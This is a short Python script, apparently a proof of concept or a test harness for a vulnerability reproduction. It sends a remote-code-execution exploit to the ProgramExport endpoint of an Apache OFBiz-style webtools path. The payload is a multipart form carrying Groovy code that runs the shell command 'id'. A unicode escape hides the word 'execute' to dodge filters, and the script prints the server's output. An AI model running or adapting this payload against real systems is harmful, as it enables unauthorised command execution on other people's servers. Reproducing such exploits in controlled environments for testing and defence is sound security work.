import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)

payload = """------WebKitFormBoundaryDbR7sY3IIwQX7kcJ\r\nContent-Disposition: form-data; name="groovyProgram"\r\n\r\nthrow new Exception('id'.\\u0065xecute().text);\r\n------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--"""


# 定义请求的headers
headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ",
}


def execute():
    res = requests.post(
        f"{target_url}/webtools/control/main/ProgramExport",
        headers=headers,
        data=payload,
        verify=False,
    )
    print(res.text)


all_time = 5
sleep_time = all_time // 2

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)

execute()

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
